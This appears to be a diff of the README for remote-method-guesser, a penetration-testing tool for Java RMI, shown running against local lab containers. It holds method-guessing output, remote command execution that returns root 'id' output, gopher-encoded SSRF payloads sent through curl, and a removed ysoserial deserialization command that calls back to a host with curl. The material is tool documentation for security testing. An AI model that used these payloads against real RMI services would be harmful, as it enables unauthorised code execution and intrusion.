 [+] 	752 methods were successfully parsed.
-[+] Reading method candidates from internal wordlist rmiscout.txt
-[+] 	2550 methods were successfully parsed.
+[+] 	Updating wordlist file.
 [+]
-[+] Starting Method Guessing on 3294 method signature(s).
+[+] Starting Method Guessing on 752 method signature(s).
 [+]
 [+] 	MethodGuesser is running:
 [+] 		--------------------------------
+[+] 		[ plain-server  ] HIT! Method with signature String execute(String dummy) exists!
+[+] 		[ plain-server  ] HIT! Method with signature String system(String dummy, String[] dummy2) exists!
 [+] 		[ ssl-server    ] HIT! Method with signature String system(String[] dummy) exists!
 [+] 		[ ssl-server    ] HIT! Method with signature int execute(String dummy) exists!
-[+] 		[ ssl-server    ] HIT! Method with signature void releaseRecord(int recordID, String tableName, Integer remoteHashCode) exists!
-[+] 		[ plain-server  ] HIT! Method with signature String system(String dummy, String[] dummy2) exists!
 [+] 		[ secure-server ] HIT! Method with signature void logMessage(int dummy1, Object dummy2) exists!
-[+] 		[ plain-server  ] HIT! Method with signature String execute(String dummy) exists!
-[+] 		[ secure-server ] HIT! Method with signature void updatePreferences(java.util.ArrayList dummy1) exists!
 [+] 		[ secure-server ] HIT! Method with signature String login(java.util.HashMap dummy1) exists!
+[+] 		[ secure-server ] HIT! Method with signature void updatePreferences(java.util.ArrayList dummy1) exists!
+[+] 		[2256 / 2256] [#####################################] 100%
 [+] 	done.
 [+]
 [+] Listing successfully guessed methods:
 [+]
 [+] 	- plain-server
-[+] 		--> String system(String dummy, String[] dummy2)
 [+] 		--> String execute(String dummy)
-[+] 	- secure-server
-[+] 		--> void logMessage(int dummy1, Object dummy2)
-[+] 		--> void updatePreferences(java.util.ArrayList dummy1)
-[+] 		--> String login(java.util.HashMap dummy1)
+[+] 		--> String system(String dummy, String[] dummy2)
 [+] 	- ssl-server
 [+] 		--> String system(String[] dummy)
 [+] 		--> int execute(String dummy)
-[+] 		--> void releaseRecord(int recordID, String tableName, Integer remoteHashCode)
+[+] 	- secure-server
+[+] 		--> void logMessage(int dummy1, Object dummy2)
+[+] 		--> String login(java.util.HashMap dummy1)
+[+] 		--> void updatePreferences(java.util.ArrayList dummy1)
+
+[qtc@devbox ~]$ head -n 5 /tmp/wordlist.txt
+String call(String dummy); 6072772491684722760; 0; false
+String call(String dummy, String dummy2); -5340760563417170050; 0; false
+String call(String dummy, String dummy2, String dummy3); -6078616129276353442; 0; false
+String call(String dummy, String[] dummy2); 6278640985022911931; 0; false
+String call(String[] dummy); 7759068303290927030; 0; false
 ```
 
-To reduce the overhead of dynamic class generation, *rmg* also supports an optimized wordlist format that
-contains the pre-computed method hashes and some meta information about the methods.
+*remote-method-guesser's* uses invalid argument types during method calls. This allows to identify valid method signatures while
+not leading to real method invocations on the server side. Methods with zero arguments are skipped by default. You can enable them
+by using the ``--zero-arg`` option. However, keep in mind that zero argument methods lead to real method calls on the server side,
+as their invocation cannot be prevented by using invalid argument types.
+
+When methods have been successfully guessed, you may want to invoke them using regular *RMI* calls (e.g. ``String execute(String dummy)``
+from above). The preferred way of doing this is by using *remote-method-guesser's* call action:
 
 ```console
-[qtc@kali wordlists]$ head -n 5 rmg.txt 
-boolean call(String dummy, String dummy2, String dummy3); 2142673766403641873; false; false
-boolean call(String dummy, String dummy2); -9048491806834107285; false; false
-boolean call(String dummy, String[] dummy2); 7952470873340381142; false; false
-boolean call(String dummy); -5603201874062960450; false; false
-boolean call(String[] dummy); -4301784332653484516; false; false
+[qtc@devbox remote-method-guesser]$ rmg call --ssl 172.17.0.2 1090 '"id"' --signature "String execute(String dummy)" --bound-name plain-server --plugin GenericPrint.har
+[+] uid=0(root) gid=0(root) groups=0(root)
 ```
 
-To transform a plain wordlist file into the optimized format, just use the ``--update`` option during the ``guess``
-operation. This will update all currently used wordlist files to the optimized format.
-
-
-### Registry and DGC Actions
-
-------
-
-Apart from *remote methods* on the application level, *RMI* endpoints also expose well known *remote* methods that are needed for the internal *RMI communication*.
-In the old days (before *JEP 290*), these internal *remote methods* were vulnerable to exactly the same deserialization attacks as described above. However,
-with *JEP 290* deserialization filters were implemented for all internal *RMI communication* and deserialization attacks were (theoretically) no longer possible. 
-
-During it's *enum* action, *remote-method-guesser* already checks whether *JEP290* is installed on the targeted server. For testing purposes you can use the
-[example-server](https://github.com/qtc-de/beanshooter/packages/398561) of the [beanshooter](https://github.com/qtc-de/beanshooter) project, which is running
-an unpatched version of *Java*. The following output shows that *remote-method-guesser* successfully identifies the missing *JEP 290* installation:
+However, *remote-method-guesser* can also dynamically create some *Java* code that can be used to call the identified methods.
+To use the dynamic code generation, just specify the ``--create-samples`` option during the ``guess`` action.
 
 ```console
-[qtc@kali ~]$ rmg --ssl 172.18.0.2 9010
-[+] Creating RMI Registry object... done.
-[+] Obtaining list of bound names... done.
-[+] 1 names are bound to the registry.
+[qtc@devbox ~]$ rmg guess --ssl 172.17.0.2 1090 --signature "String execute(String dummy)" --bound-name plain-server --create-samples
+[+] Starting Method Guessing on 1 method signature(s).
+[+] Method signature: String execute(String dummy).
+[+]
+[+] 	MethodGuesser is running:
+[+] 		--------------------------------
+[+] 		[ plain-server ] HIT! Method with signature String execute(String dummy) exists!
+[+] 		[1 / 1] [#####################################] 100%
+[+] 	done.
+[+]
+[+] Listing successfully guessed methods:
+[+]
+[+] 	- plain-server
+[+] 		--> String execute(String dummy)
+[+]
+[+] Starting creation of sample files:
+[+]
+[+] 	Sample folder /home/qtc/rmg-samples does not exist.
+[+] 	Creating sample folder.
+[+]
+[+] 	Creating samples for bound name plain-server.
+[+] 		Writing sample file /home/qtc/rmg-samples/plain-server/IPlainServer.java
+[+] 		Writing sample file /home/qtc/rmg-samples/plain-server/execute/execute.java
+```
+
+To use the dynamically create *Java* code, first compile the interface class (``IPlainServer.java``).
+Then adjust the argument values for your call in the method class (``execute.java``):
+
+```console
+[qtc@devbox ~]$ cd rmg-samples/plain-server/
+[qtc@devbox plain-server]$ ls
+execute  IPlainServer.java
+[qtc@devbox plain-server]$ javac IPlainServer.java -d execute/
+[qtc@devbox plain-server]$ cd execute/
+[qtc@devbox execute]$ rg 'TODO' execute.java
+100:            java.lang.String argument0 = TODO;
+[qtc@devbox execute]$ sed -i 's/TODO/"id"/' execute.java
+[qtc@devbox execute]$ javac execute.java
+[qtc@devbox execute]$ java execute
+[+] Connecting to registry on 172.17.0.2:1090... done!
+[+] Starting lookup on plain-server...
 [+] RMI object tries to connect to different remote host: iinsecure.dev
-[+] 	Redirecting the ssl connection back to 172.18.0.2... 
-[+] 	This is done for all further requests. This message is not shown again. 
-[+] 
-[+] Listing bound names in registry:
-[+] 
+[+]	Redirecting the connection back to 172.17.0.2...
+[+]	This is done for all further requests. This message is not shown again.
+[+] Invoking method execute... done!
+[+] The servers response is: uid=0(root) gid=0(root) groups=0(root)
+```
+
+
+### SSRF Support
+
+----
+
+Since *remote-method-guesser* version *v4.0.0*, most actions support the ``--ssrf`` option. Instead of contacting the specified
+*RMI* service directly, *remote-method-guesser* creates an corresponding *SSRF* payload when the ``--ssrf`` option is used.
+Additionally, the ``--gopher`` and ``--encode`` options can be used to create an ready to use *gopher* payload:
+
+```console
+[qtc@devbox ~]$ rmg enum 172.17.0.2 1090 --ssrf --gopher --encode
+[+] SSRF Payload: gopher%3A%2F%2F172.17.0.2%3A1090%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2501%2544%2515%254d%25c9%25d4%25e6%253b%25df
+```
+
+When targeting *RMI* services via *SSRF*, there are two requirements that need to be satisfied:
+
+1. The *SSRF* endpoint allows you to send arbitrary byte values to the target *RMI* service. Especially, this includes
+   *NULL bytes*, that are usually required during *RMI* communication. *SSRF* endpoints with *gopher* support are probably the
+   most common scenario to meet this requirement. That being said, newer versions of *curl* even prevent *NULL bytes* in
+   *gopher* payloads.
+
+2. *RMI* communication requires the client to know the ``ObjID`` value of the target remote object. When talking to the
+   *RMI registry*, the *Distributed Garbage Collector* or the *Activation System*, the ``ObjID`` value is already known
+   and requirement one is sufficient for an *SSRF* attack. When talking to other remote objects, you need a way
+   to lookup the corresponding ``ObjID`` first. The ``ObjID`` value of remote objects is usually stored in the *RMI registry*
+   and can also be looked up using an *SSRF* attack. However, for this to work the *SSRF* endpoint needs to be capable
+   of returning arbitrary byte values obtained from the *RMI* endpoint. Responses from the *RMI* server can be feed back into
+   *remote-method-guesser* by using the ``--ssrf-response`` option. *remote-method-guesser* then attempts to parse the response
+   as it was directly obtained from the *RMI* service during the specified action.
+
+The two requirements mentioned above restrict *SSRF* attacks on *Java RMI* endpoints quite a bit. However, when both conditions
+are met, you can fully utilize the *RMI* service via *SSRF*. The *remote-method-guesser* repository also contains an [SSRF example
+server](docker pull ghcr.io/qtc-de/remote-method-guesser/rmg-ssrf-server:1.0), that can be used to practice *SSRF* attacks against
+*Java RMI*.
+
+To perform the different checks of *remote-method-guesser's* ``enum`` action via *SSRF*, you can use the ``--scan-action`` option.
+Without specifying this option, the *SSRF* payload generated for the ``enum`` action is similar to the payload created when using
+``--scan-action list``:
+
+```console
+[qtc@devbox ~]$ rmg enum 127.0.0.1 1090 --ssrf --gopher --encode
+[+] SSRF Payload: gopher%3A%2F%2F127.0.0.1%3A1090%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2501%2544%2515%254d%25c9%25d4%25e6%253b%25df
+
+[qtc@devbox ~]$ curl 172.17.0.2:8000/?url=gopher%3A%2F%2F172.17.0.2%3A1090%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2501%2544%2515%254d%25c9%25d4%25e6%253b%25df 2>/dev/null | xxd -p -c1000
+4e00093132372e302e302e310000c48651aced0005770f01c95068b90000017d8947959b8008757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000074002f687474703a2f2f6c6f63616c686f73743a383030302f726d692d636c6173732d646566696e6974696f6e732e6a617278700000000274000b46696c654d616e616765727400066a6d78726d69
+
+[qtc@devbox ~]$ rmg enum 127.0.0.1 1090 --ssrf-response 4e00093132372e302e302e310000c48651aced0005770f01c95068b90000017d8947959b8008757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000074002f687474703a2f2f6c6f63616c686f73743a383030302f726d692d636c6173732d646566696e6974696f6e732e6a617278700000000274000b46696c654d616e616765727400066a6d78726d69
+[+] RMI registry bound names:
+[+]
+[+] 	- FileManager
 [+] 	- jmxrmi
-[+] 		--> javax.management.remote.rmi.RMIServerImpl_Stub (known class)
-[+] 
+```
+
+The ``--scan-action list`` action is limited to showing the available bound names when used without further arguments. By using
+the ``--bound-name`` during the action, more detailed information can be obtained:
+
+```console
+[qtc@devbox ~]$ rmg enum 127.0.0.1 1090 --ssrf --gopher --encode --bound-name FileManager
+[+] SSRF Payload: gopher%3A%2F%2F127.0.0.1%3A1090%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2502%2544%2515%254d%25c9%25d4%25e6%253b%25df%2574%2500%250b%2546%2569%256c%2565%254d%2561%256e%2561%2567%2565%2572
+
+[qtc@devbox ~]$ curl 172.17.0.2:8000/?url=gopher%3A%2F%2F127.0.0.1%3A1090%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2502%2544%2515%254d%25c9%25d4%25e6%253b%25df%2574%2500%250b%2546%2569%256c%2565%254d%2561%256e%2561%2567%2565%2572 2>/dev/null | xxd -p -c1000
+4e00093132372e302e302e310000c48c51aced0005770f01c95068b90000017d8947959b800a737d00000002000f6a6176612e726d692e52656d6f7465002764652e7174632e726d672e7365727665722e737372662e726d692e4946696c654d616e6167657274002f687474703a2f2f6c6f63616c686f73743a383030302f726d692d636c6173732d646566696e6974696f6e732e6a6172787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b71007e000178707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c6572000000000000000202000071007e00017872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000071007e000178707732000a556e696361737452656600096c6f63616c686f737400009077040fba7d4c453576c95068b90000017d8947959b80010178
+
+[qtc@devbox ~]$ rmg enum 127.0.0.1 1090 --bound-name FileManager --ssrf-response 4e00093132372e302e302e310000c48c51aced0005770f01c95068b90000017d8947959b800a737d00000002000f6a6176612e726d692e52656d6f7465002764652e7174632e726d672e7365727665722e737372662e726d692e4946696c654d616e6167657274002f687474703a2f2f6c6f63616c686f73743a383030302f726d692d636c6173732d646566696e6974696f6e732e6a6172787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b71007e000178707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c6572000000000000000202000071007e00017872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000071007e000178707732000a556e696361737452656600096c6f63616c686f737400009077040fba7d4c453576c95068b90000017d8947959b80010178
+[+] RMI registry bound names:
+[+]
+[+] 	- FileManager
+[+] 		--> de.qtc.rmg.server.ssrf.rmi.IFileManager (unknown class)
+[+] 		    Endpoint: localhost:36983 ObjID: [-36af9747:17d8947959b:-7fff, 292657548115654006]
+[+]
 [+] RMI server codebase enumeration:
-[+] 
-[+] 	- The remote server does not expose any codebases.
-[+] 
-[+] RMI server String unmarshalling enumeration:
-[+] 
-[+] 	- Server attempted to deserialize object locations during lookup call.
-[+] 	  --> The type java.lang.String is unmarshalled via readObject().
-[+] 
-[+] RMI server useCodebaseOnly enumeration:
-[+] 
-[+] 	- Caught ClassCastException during lookup call.
-[+] 	  --> The server ignored the provided codebase (useCodebaseOnly=true).
-[+] 
-[+] RMI registry localhost bypass enumeration (CVE-2019-2684):
-[+] 
-[+] 	Caught AccessException during unbindcall.
-[+] 	The servers seems to use a SingleEntryRegistry (probably JMX based).
-[+] 
-[+] RMI server DGC enumeration:
-[+] 
-[+] 	- RMI server does not use a SecurityManager during DGC operations.
-[+] 	  Remote class loading attacks are not possible.
-[+] 
-[+] RMI server JEP290 enumeration:
-[+] 
-[+] 	- DGC accepted deserialization of java.util.HashMap (JEP290 is not installed).
+[+]
+[+] 	- http://localhost:8000/rmi-class-definitions.jar
+[+] 		--> de.qtc.rmg.server.ssrf.rmi.IFileManager
 ```
 
-To confirm that the server is vulnerable you can perform a dedicated *deserialization attack* on the *DGC level* (*DGC* = *Distributed Garbage Collector*,
-a *remote object* that is available on almost each *RMI endpoint*). This can be done
-by using the ``dgc`` action of *remote-method-guesser*, which allows you to send *ysoserial* gadgets to the *DGC endpoint*:
+Apart from ``list`` the following scan actions are available:
+
+* activator
+* codebase
+* filter-bypass
+* jep290
+* list
+* localhost-bypass
+* security-manager
+* string-marshalling
+
+The following output shows an example for the ``filter-bypass`` action:
 
 ```console
-[qtc@kali ~]$ rmg --ssl 172.18.0.2 9010 dgc CommonsCollections6 "curl 172.18.0.1:8000/vulnerable"
-[+] Creating ysoserial payload... done.
-[+] Attempting ysoserial attack on DGC endpoint...
-[+] 
-[+] 	Caught ClassCastException during deserialization attack.
-[+] 	Deserialization attack most likely worked :)
+[qtc@devbox ~]$ rmg enum 127.0.0.1 1090 --ssrf --gopher --encode --scan-action filter-bypass
+[+] RMI registry JEP290 bypass enmeration:
+[+]
+[+] 	SSRF Payload: gopher%3A%2F%2F127.0.0.1%3A1090%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2502%2544%2515%254d%25c9%25d4%25e6%253b%25df%2573%2572%2500%2523%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2555%256e%2569%2563%2561%2573%2574%2552%2565%256d%256f%2574%2565%254f%2562%256a%2565%2563%2574%2545%2509%2512%2515%25f5%25e2%257e%2531%2502%2500%2503%2549%2500%2504%2570%256f%2572%2574%254c%2500%2503%2563%2573%2566%2574%2500%2528%254c%256a%2561%2576%2561%252f%2572%256d%2569%252f%2573%2565%2572%2576%2565%2572%252f%2552%254d%2549%2543%256c%2569%2565%256e%2574%2553%256f%2563%256b%2565%2574%2546%2561%2563%2574%256f%2572%2579%253b%254c%2500%2503%2573%2573%2566%2574%2500%2528%254c%256a%2561%2576%2561%252f%2572%256d%2569%252f%2573%2565%2572%2576%2565%2572%252f%2552%254d%2549%2553%2565%2572%2576%2565%2572%2553%256f%2563%256b%2565%2574%2546%2561%2563%2574%256f%2572%2579%253b%2570%2578%2572%2500%251c%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%2565%256d%256f%2574%2565%2553%2565%2572%2576%2565%2572%25c7%2519%2507%2512%2568%25f3%2539%25fb%2502%2500%2500%2570%2578%2572%2500%251c%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%2565%256d%256f%2574%2565%254f%2562%256a%2565%2563%2574%25d3%2561%25b4%2591%250c%2561%2533%251e%2503%2500%2500%2570%2578%2570%2577%2513%2500%2511%2555%256e%2569%2563%2561%2573%2574%2553%2565%2572%2576%2565%2572%2552%2565%2566%2532%2578%2500%2500%2500%2500%2570%2573%257d%2500%2500%2500%2502%2500%2526%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%254d%2549%2553%2565%2572%2576%2565%2572%2553%256f%2563%256b%2565%2574%2546%2561%2563%2574%256f%2572%2579%2500%250f%256a%2561%2576%2561%252e%2572%256d%2569%252e%2552%2565%256d%256f%2574%2565%2570%2578%2572%2500%2517%256a%2561%2576%2561%252e%256c%2561%256e%2567%252e%2572%2565%2566%256c%2565%2563%2574%252e%2550%2572%256f%2578%2579%25e1%2527%25da%2520%25cc%2510%2543%25cb%2502%2500%2501%254c%2500%2501%2568%2574%2500%2525%254c%256a%2561%2576%2561%252f%256c%2561%256e%2567%252f%2572%2565%2566%256c%2565%2563%2574%252f%2549%256e%2576%256f%2563%2561%2574%2569%256f%256e%2548%2561%256e%2564%256c%2565%2572%253b%2570%2578%2570%2573%2572%2500%252d%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%2565%256d%256f%2574%2565%254f%2562%256a%2565%2563%2574%2549%256e%2576%256f%2563%2561%2574%2569%256f%256e%2548%2561%256e%2564%256c%2565%2572%2500%2500%2500%2500%2500%2500%2500%2502%2502%2500%2500%2570%2578%2571%2500%257e%2500%2504%2577%2532%2500%250a%2555%256e%2569%2563%2561%2573%2574%2552%2565%2566%2500%2509%2531%2532%2537%252e%2530%252e%2530%252e%2531%2500%2512%25d6%2587%2500%2500%2500%2500%2500%2500%2500%257b%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2578
 
-[...]
+[qtc@devbox ~]$ curl 172.17.0.2:8000/?url=gopher%3A%2F%2F127.0.0.1%3A1090%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2502%2544%2515%254d%25c9%25d4%25e6%253b%25df%2573%2572%2500%2523%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2555%256e%2569%2563%2561%2573%2574%2552%2565%256d%256f%2574%2565%254f%2562%256a%2565%2563%2574%2545%2509%2512%2515%25f5%25e2%257e%2531%2502%2500%2503%2549%2500%2504%2570%256f%2572%2574%254c%2500%2503%2563%2573%2566%2574%2500%2528%254c%256a%2561%2576%2561%252f%2572%256d%2569%252f%2573%2565%2572%2576%2565%2572%252f%2552%254d%2549%2543%256c%2569%2565%256e%2574%2553%256f%2563%256b%2565%2574%2546%2561%2563%2574%256f%2572%2579%253b%254c%2500%2503%2573%2573%2566%2574%2500%2528%254c%256a%2561%2576%2561%252f%2572%256d%2569%252f%2573%2565%2572%2576%2565%2572%252f%2552%254d%2549%2553%2565%2572%2576%2565%2572%2553%256f%2563%256b%2565%2574%2546%2561%2563%2574%256f%2572%2579%253b%2570%2578%2572%2500%251c%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%2565%256d%256f%2574%2565%2553%2565%2572%2576%2565%2572%25c7%2519%2507%2512%2568%25f3%2539%25fb%2502%2500%2500%2570%2578%2572%2500%251c%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%2565%256d%256f%2574%2565%254f%2562%256a%2565%2563%2574%25d3%2561%25b4%2591%250c%2561%2533%251e%2503%2500%2500%2570%2578%2570%2577%2513%2500%2511%2555%256e%2569%2563%2561%2573%2574%2553%2565%2572%2576%2565%2572%2552%2565%2566%2532%2578%2500%2500%2500%2500%2570%2573%257d%2500%2500%2500%2502%2500%2526%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%254d%2549%2553%2565%2572%2576%2565%2572%2553%256f%2563%256b%2565%2574%2546%2561%2563%2574%256f%2572%2579%2500%250f%256a%2561%2576%2561%252e%2572%256d%2569%252e%2552%2565%256d%256f%2574%2565%2570%2578%2572%2500%2517%256a%2561%2576%2561%252e%256c%2561%256e%2567%252e%2572%2565%2566%256c%2565%2563%2574%252e%2550%2572%256f%2578%2579%25e1%2527%25da%2520%25cc%2510%2543%25cb%2502%2500%2501%254c%2500%2501%2568%2574%2500%2525%254c%256a%2561%2576%2561%252f%256c%2561%256e%2567%252f%2572%2565%2566%256c%2565%2563%2574%252f%2549%256e%2576%256f%2563%2561%2574%2569%256f%256e%2548%2561%256e%2564%256c%2565%2572%253b%2570%2578%2570%2573%2572%2500%252d%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%2565%256d%256f%2574%2565%254f%2562%256a%2565%2563%2574%2549%256e%2576%256f%2563%2561%2574%2569%256f%256e%2548%2561%256e%2564%256c%2565%2572%2500%2500%2500%2500%2500%2500%2500%2502%2502%2500%2500%2570%2578%2571%2500%257e%2500%2504%2577%2532%2500%250a%2555%256e%2569%2563%2561%2573%2574%2552%2565%2566%2500%2509%2531%2532%2537%252e%2530%252e%2530%252e%2531%2500%2512%25d6%2587%2500%2500%2500%2500%2500%2500%2500%257b%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2578 2>/dev/null | xxd -p -c10000
+4e00093132372e302e302e310000c49651aced0005770f02c95068b90000017d8947959b800f737200226a6176612e6c616e672e496c6c6567616c417267756d656e74457863657074696f6eb58973d37d668fbc02000074002f687474703a2f2f6c6f63616c686f73743a383030302f726d692d636c6173732d646566696e6974696f6e732e6a61727872001a6a6176612e6c616e672e52756e74696d65457863657074696f6e9e5f06470a3483e502000071007e0001787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc402000071007e0001787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b71007e0001787071007e0009740019706f7274206f7574206f662072616e67653a313233343536377572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd223902000071007e000178700000002d7372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd85020008420006666f726d617449000a6c696e654e756d6265724c000f636c6173734c6f616465724e616d6571007e00064c000e6465636c6172696e67436c61737371007e00064c000866696c654e616d6571007e00064c000a6d6574686f644e616d6571007e00064c000a6d6f64756c654e616d6571007e00064c000d6d6f64756c6556657273696f6e71007e000671007e0001787002ffffffff7074001a6a6176612e6e65742e496e6574536f636b65744164647265737370740009636865636b506f72747400096a6176612e62617365740005392e302e347371007e000d02ffffffff7071007e000f707400063c696e69743e71007e001171007e00127371007e000d02ffffffff7074000f6a6176612e6e65742e536f636b65747071007e001471007e001171007e00127371007e000d010000001674000361707074003164652e7174632e726d672e7365727665722e737372662e726d692e4c6f63616c686f7374536f636b6574466163746f727974001b4c6f63616c686f7374536f636b6574466163746f72792e6a61766174000c637265617465536f636b657470707371007e000d02ffffffff7074002173756e2e726d692e7472616e73706f72742e7463702e544350456e64706f696e74707400096e6577536f636b65747400086a6176612e726d6971007e00127371007e000d02ffffffff7074002073756e2e726d692e7472616e73706f72742e7463702e5443504368616e6e656c70740010637265617465436f6e6e656374696f6e71007e001f71007e00127371007e000d02ffffffff7071007e00217074000d6e6577436f6e6e656374696f6e71007e001f71007e00127371007e000d02ffffffff7074001973756e2e726d692e7365727665722e556e696361737452656670740006696e766f6b6571007e001f71007e00127371007e000d02ffffffff7074002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657270740012696e766f6b6552656d6f74654d6574686f6471007e001f71007e00127371007e000d02ffffffff7071007e00297071007e002771007e001f71007e00127371007e000d01ffffffff740008706c6174666f726d740015636f6d2e73756e2e70726f78792e2450726f78793370740012637265617465536572766572536f636b657470707371007e000d02ffffffff7071007e001d7074000f6e6577536572766572536f636b657471007e001f71007e00127371007e000d02ffffffff7074002273756e2e726d692e7472616e73706f72742e7463702e5443505472616e73706f7274707400066c697374656e71007e001f71007e00127371007e000d02ffffffff7071007e00337074000c6578706f72744f626a65637471007e001f71007e00127371007e000d02ffffffff7071007e001d7071007e003671007e001f71007e00127371007e000d02ffffffff7074001973756e2e726d692e7472616e73706f72742e4c6976655265667071007e003671007e001f71007e00127371007e000d02ffffffff7074001f73756e2e726d692e7365727665722e556e69636173745365727665725265667071007e003671007e001f71007e00127371007e000d02ffffffff707400236a6176612e726d692e7365727665722e556e696361737452656d6f74654f626a6563747071007e003671007e001f71007e00127371007e000d02ffffffff7071007e003d7071007e003671007e001f71007e00127371007e000d02ffffffff7071007e003d7074000872656578706f727471007e001f71007e00127371007e000d02ffffffff7071007e003d7074000a726561644f626a65637471007e001f71007e00127371007e000d02fffffffe7074002d6a646b2e696e7465726e616c2e7265666c6563742e4e61746976654d6574686f644163636573736f72496d706c70740007696e766f6b653071007e001171007e00127371007e000d02ffffffff7071007e00447071007e002771007e001171007e00127371007e000d02ffffffff707400316a646b2e696e7465726e616c2e7265666c6563742e44656c65676174696e674d6574686f644163636573736f72496d706c7071007e002771007e001171007e00127371007e000d02ffffffff707400186a6176612e6c616e672e7265666c6563742e4d6574686f647071007e002771007e001171007e00127371007e000d02ffffffff707400196a6176612e696f2e4f626a65637453747265616d436c61737370740010696e766f6b65526561644f626a65637471007e001171007e00127371007e000d02ffffffff707400196a6176612e696f2e4f626a656374496e70757453747265616d7074000e7265616453657269616c4461746171007e001171007e00127371007e000d02ffffffff7071007e004f70740012726561644f7264696e6172794f626a65637471007e001171007e00127371007e000d02ffffffff7071007e004f7074000b726561644f626a6563743071007e001171007e00127371007e000d02ffffffff7071007e004f7071007e004271007e001171007e00127371007e000d02ffffffff7074002273756e2e726d692e72656769737472792e5265676973747279496d706c5f536b656c70740008646973706174636871007e001f71007e00127371007e000d02ffffffff7071007e003b7074000b6f6c64446973706174636871007e001f71007e00127371007e000d02ffffffff7071007e003b7071007e005871007e001f71007e00127371007e000d02ffffffff7074001d73756e2e726d692e7472616e73706f72742e5472616e73706f727424317074000372756e71007e001f71007e00127371007e000d02ffffffff7071007e005d7071007e005e71007e001f71007e00127371007e000d02fffffffe7074001e6a6176612e73656375726974792e416363657373436f6e74726f6c6c65727074000c646f50726976696c6567656471007e001171007e00127371007e000d02ffffffff7074001b73756e2e726d692e7472616e73706f72742e5472616e73706f72747074000b7365727669636543616c6c71007e001f71007e00127371007e000d02ffffffff7071007e00337074000e68616e646c654d6573736167657371007e001f71007e00127371007e000d02ffffffff7074003473756e2e726d692e7472616e73706f72742e7463702e5443505472616e73706f727424436f6e6e656374696f6e48616e646c